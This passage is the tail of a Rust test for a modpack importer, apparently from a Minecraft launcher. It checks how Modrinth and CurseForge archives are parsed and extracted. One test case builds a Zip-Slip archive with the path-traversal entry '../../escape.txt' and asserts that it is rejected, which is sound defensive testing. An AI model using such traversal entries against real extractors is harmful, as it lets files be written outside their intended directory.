        assert_eq!(mr_out.format, ImportedArchiveFormat::ModrinthMrpack);
        assert_eq!(mr_out.manifest.name, "Local Mrpack");
        assert_eq!(mr_out.manifest.mc_version, "1.21.1");
        assert_eq!(mr_out.manifest.loader, ModLoaderKind::Quilt);
        assert_eq!(mr_out.manifest.loader_version.as_deref(), Some("0.26.0"));
        assert_eq!(
            fs::read_to_string(mr_out.instance_dir.join("config/base.toml")).unwrap(),
            "a = 2\n"
        );

        // 3. Local CurseForge `.zip` import
        let cf_zip = tmp.path().join("local-cfpack.zip");
        {
            let file = File::create(&cf_zip).unwrap();
            let mut zw = ZipWriter::new(file);
            let opts = SimpleFileOptions::default();
            let cf_manifest = serde_json::json!({
                "minecraft": {
                    "version": "1.20.1",
                    "modLoaders": [{ "id": "forge-47.2.0", "primary": true }]
                },
                "manifestType": "minecraftModpack",
                "manifestVersion": 1,
                "name": "Local CF Modpack",
                "version": "1.0",
                "files": [],
                "overrides": "overrides"
            });
            zw.start_file("manifest.json", opts).unwrap();
            zw.write_all(cf_manifest.to_string().as_bytes()).unwrap();
            zw.start_file("overrides/config/forge.toml", opts).unwrap();
            zw.write_all(b"forge = true\n").unwrap();
            zw.finish().unwrap();
        }

        let cf_out = import_instance_archive_detailed(&cf_zip, &dest_root, None).unwrap();
        assert_eq!(cf_out.format, ImportedArchiveFormat::CurseForgeZip);
        assert_eq!(cf_out.manifest.name, "Local CF Modpack");
        assert_eq!(cf_out.manifest.mc_version, "1.20.1");
        assert_eq!(cf_out.manifest.loader, ModLoaderKind::Forge);
        assert_eq!(cf_out.manifest.loader_version.as_deref(), Some("47.2.0"));
        assert_eq!(
            fs::read_to_string(cf_out.instance_dir.join("config/forge.toml")).unwrap(),
            "forge = true\n"
        );

        // 4. Zip-Slip archive must be rejected with MqError::ZipSlip
        let slip_zip = tmp.path().join("slip.zip");
        {
            let file = File::create(&slip_zip).unwrap();
            let mut zw = ZipWriter::new(file);
            let opts = SimpleFileOptions::default();
            zw.start_file("../../escape.txt", opts).unwrap();
            zw.write_all(b"evil").unwrap();
            zw.finish().unwrap();
        }
        let slip_err = import_instance_from_zip(&slip_zip, &dest_root, None).unwrap_err();
        assert!(matches!(slip_err, MqError::ZipSlip { .. }));
    }
}
